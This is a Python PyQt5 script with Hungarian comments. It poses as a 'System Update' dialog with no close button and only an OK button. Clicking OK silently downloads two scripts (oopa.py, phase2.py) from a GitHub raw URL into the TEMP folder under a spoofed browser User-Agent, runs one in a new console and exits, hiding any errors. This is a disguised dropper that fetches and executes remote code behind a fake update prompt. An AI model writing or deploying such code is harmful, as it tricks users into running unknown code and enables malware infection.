import sys
import os
import urllib.request
import subprocess
from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(400, 150)
        
        # Ablak beállítások: nincs bezáró gomb, csak a fejléc
        Dialog.setWindowFlags(QtCore.Qt.Window | QtCore.Qt.WindowTitleHint | QtCore.Qt.CustomizeWindowHint)

        self.buttonBox = QtWidgets.QDialogButtonBox(Dialog)
        self.buttonBox.setGeometry(QtCore.QRect(30, 100, 341, 32))
        self.buttonBox.setOrientation(QtCore.Qt.Horizontal)
        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Ok)
        self.buttonBox.setObjectName("buttonBox")

        self.textBrowser = QtWidgets.QTextBrowser(Dialog)
        self.textBrowser.setGeometry(QtCore.QRect(20, 20, 361, 71))
        self.textBrowser.setObjectName("textBrowser")
        
        self.retranslateUi(Dialog)
        
        # OK gomb összekötése az indítással
        self.buttonBox.accepted.connect(self.start_install)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "System Update"))
        self.textBrowser.setHtml(_translate("Dialog", "<html><body><p align='center'>A rendszerfrissítések telepítéséhez kattintson az <b>OK</b> gombra.</p></body></html>"))

    def start_install(self):
        """Ez a függvény felel az oopa.py megnyitásáért"""
        try:
            # 1. Útvonalak meghatározása
            # Megnézzük a program mellett és a TEMP-ben is
            current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
            temp_path = os.getenv("TEMP")
            
            oopa_local = os.path.join(current_dir, "oopa.py")
            oopa_temp = os.path.join(temp_path, "oopa.py")
            phase2_temp = os.path.join(temp_path, "phase2.py")

            # 2. Letöltési kísérlet (ha nincs meg helyben a fájl)
            # Ide írtam be a Git linkjeidet
            urls = {
                "https://raw.githubusercontent.com/plen-maker/Vers1/main/oopa.py": oopa_temp,
                "https://raw.githubusercontent.com/plen-maker/Vers1/main/phase2.py": phase2_temp
            }

            opener = urllib.request.build_opener()
            opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
            urllib.request.install_opener(opener)

            # Megpróbáljuk letölteni, ha nem létezik helyben
            if not os.path.exists(oopa_local):
                for url, path in urls.items():
                    try:
                        urllib.request.urlretrieve(url, path)
                    except:
                        pass
                target_script = oopa_temp
            else:
                target_script = oopa_local

            # 3. AZ OOPA.PY MEGNYITÁSA (Ez volt a hiba javítása)
            # Új konzol ablakban indítjuk el a Python-nal
            if os.path.exists(target_script):
                subprocess.Popen([sys.executable, target_script], creationflags=subprocess.CREATE_NEW_CONSOLE)

            # Az installer GUI bezárása
            sys.exit()

        except Exception as e:
            sys.exit()

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    Dialog = QtWidgets.QDialog()
    ui = Ui_Dialog()
    ui.setupUi(Dialog)
    Dialog.show()
    sys.exit(app.exec_())
    